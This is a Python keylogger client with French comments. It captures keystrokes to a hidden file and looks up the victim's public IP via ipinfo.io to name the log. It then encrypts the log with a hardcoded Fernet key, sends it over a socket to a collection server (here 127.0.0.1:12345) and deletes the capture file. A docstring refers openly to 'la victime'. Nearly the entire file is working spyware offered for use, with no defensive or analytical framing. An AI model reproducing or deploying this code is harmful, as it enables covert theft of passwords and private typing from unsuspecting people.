import keylogger
import socket
import requests
import os  
from datetime import datetime
from cryptography.fernet import Fernet
import signal

# Fonction pour obtenir le nom du fichier avec l'adresse IP et la date
def get_filename():
    now = datetime.now()
    response = requests.get("https://ipinfo.io")
    ip_data = response.json()
    public_ip = ip_data.get('ip')
    filename = public_ip + "-" + now.strftime("%d-%m-%Y-%H:%M:%S") + ".keyboard.txt"
    return filename

# Fonction pour lancer le keylogger
def launch_keylogger():
    return keylogger.listen_keyboard()

def kill_server():
    send_file_securely("127.0.0.1", 12345)
    os.kill(os.getpid(), signal.SIGINT)

# Fonction pour arrêter le keylogger et supprimer le fichier de capture
def stop_and_delete_capture_file():
    kill_server()

    file = ".document1.txt"  # Assurez-vous que c'est le bon chemin
    os.remove(file)
  

# Fonction pour envoyer le fichier de manière sécurisée au serveur via une socket SSL
def send_file_securely(server_address, server_port):
    # Créer une socket TCP
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
        # Se connecter au serveur
        client_socket.connect((server_address, server_port))

        # Envoyer le nom du fichier au serveur
        filename = get_filename()
        encrypted_message = Fernet(key).encrypt(filename.encode())
        client_socket.send(encrypted_message)

        # Envoyer le contenu du fichier au serveur
        with open(".document1.txt", "r") as file:
            lines = file.read()
            encrypted_lines = Fernet(key).encrypt(lines.encode('utf-8'))
            client_socket.send(encrypted_lines)
    finally:
        # Fermer la connexion
        client_socket.close()

if __name__ == "__main__":

    """
    Le except est un test, La victime ne ferra jamais de control C, 
    C'est pour que tu comprenne le comportement, à avoir avec la fonction kill_server.

    De plus, il faut lancer les programmes, LIRE et COMPRENDRE le code avant de CODER.
    """

    launch_keylogger()
    try:
        send_file_securely("127.0.0.1", 12345)
    except KeyboardInterrupt:
        kill_server()
    

